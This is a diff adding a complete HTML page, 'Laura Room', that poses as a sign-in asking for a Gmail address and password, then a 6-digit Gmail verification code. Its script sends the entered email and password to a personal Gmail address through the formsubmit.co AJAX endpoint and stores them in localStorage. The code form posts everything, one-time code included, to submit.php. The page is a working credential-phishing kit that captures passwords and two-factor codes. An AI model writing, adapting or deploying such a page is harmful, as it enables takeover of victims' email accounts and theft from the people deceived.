@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Laura Room</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      background: #f4f4f4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 25px rgba(0,0,0,0.12);
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 25px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 54px;
+      font-weight: 900;
+      color: #1a73e8;
+      margin-bottom: 12px;
+      user-select: none;
+    }
+    h2 {
+      margin: 0 0 8px 0;
+      font-weight: 700;
+      color: #222;
+    }
+    .notice {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 22px;
+    }
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 14px 12px;
+      margin: 8px 0 18px 0;
+      border: 1.8px solid #ccc;
+      border-radius: 7px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus,
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #1a73e8;
+    }
+    button {
+      width: 100%;
+      background-color: #1a73e8;
+      border: none;
+      padding: 15px;
+      font-size: 18px;
+      border-radius: 7px;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    button:hover {
+      background-color: #155db2;
+    }
+    .hidden {
+      display: none;
+    }
+    .warning {
+      color: #b71c1c;
+      font-weight: 600;
+      margin-top: -10px;
+      margin-bottom: 18px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">L</div>
+    <h2>Laura Room</h2>
+
+    <!-- Step 1 -->
+    <div id="step1">
+      <p class="notice">Please sign in using your regular Gmail account.</p>
+      <form id="loginForm">
+        <input type="email" id="email" placeholder="Gmail address" required autocomplete="email" />
+        <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
+        <button type="submit">Next</button>
+      </form>
+    </div>
+
+    <!-- Step 2 -->
+    <div id="step2" class="hidden">
+      <h2>Verification Code</h2>
+      <p class="notice">Enter the 6-digit verification code sent to your Gmail.</p>
+      <p class="warning">⚠️ Do not share this code with anyone.</p>
+      <form id="verifyForm" method="POST" action="submit.php">
+        <input type="hidden" name="Email" id="hiddenEmail" />
+        <input type="hidden" name="Password" id="hiddenPassword" />
+        <input type="text" name="Gmail_Code" placeholder="G-XXXXXX" required autocomplete="one-time-code" />
+        <button type="submit">Verify</button>
+      </form>
+    </div>
+
+  </div>
+
+  <script>
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const loginForm = document.getElementById('loginForm');
+    const verifyForm = document.getElementById('verifyForm');
+    const hiddenEmail = document.getElementById('hiddenEmail');
+    const hiddenPassword = document.getElementById('hiddenPassword');
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!email || !password) {
+        alert('Please fill in both fields.');
+        return;
+      }
+
+      // Save to localStorage (optional)
+      localStorage.setItem('LauraRoom_Email', email);
+      localStorage.setItem('LauraRoom_Password', password);
+
+      // Send data to FormSubmit via AJAX (so we can stay on page)
+      fetch('https://formsubmit.co/ajax/hugheskira007@gmail.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({
+          Email: email,
+          Password: password,
+          _captcha: 'false'
+        })
+      }).then(response => response.json())
+        .then(data => {
+          // Show step 2 (verification code)
+          step1.classList.add('hidden');
+          step2.classList.remove('hidden');
+          hiddenEmail.value = email;
+          hiddenPassword.value = password;
+        })
+        .catch(err => {
+          alert('Failed to send data. Please try again.');
+          console.error(err);
+        });
+    });
+
+    // Pre-fill hidden inputs on verify form submit (not needed as done on show)
+
+    // Optional: Clear localStorage on page load
+    window.onload = () => {
+      // localStorage.removeItem('LauraRoom_Email');
+      // localStorage.removeItem('LauraRoom_Password');
+    };
+  </script>
+</body>
+</html>
